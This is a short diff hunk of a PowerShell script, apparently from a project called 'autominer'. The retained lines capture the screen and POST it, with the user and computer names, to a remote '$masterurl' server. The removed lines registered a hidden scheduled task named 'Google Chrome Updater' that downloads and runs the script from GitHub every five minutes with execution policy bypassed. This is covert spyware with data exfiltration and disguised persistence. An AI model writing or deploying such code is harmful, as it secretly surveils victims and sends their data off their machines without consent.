@@ -97,9 +97,3 @@ $bitmap.Dispose()
 Invoke-WebRequest -Uri "$($masterurl)/saveScreenshot" -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
 # SCREENSHOT end
 
-# Scheduled Tasks adder start
-$action = New-ScheduledTaskAction -Execute "powershell" -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass "irm https://raw.githubusercontent.com/zlc1004/autominer/main/screenshot.ps1 | iex"'
-# run every 5 minutes
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Google Chrome Updater" -Description "This event checks "
-# Scheduled Tasks adder end
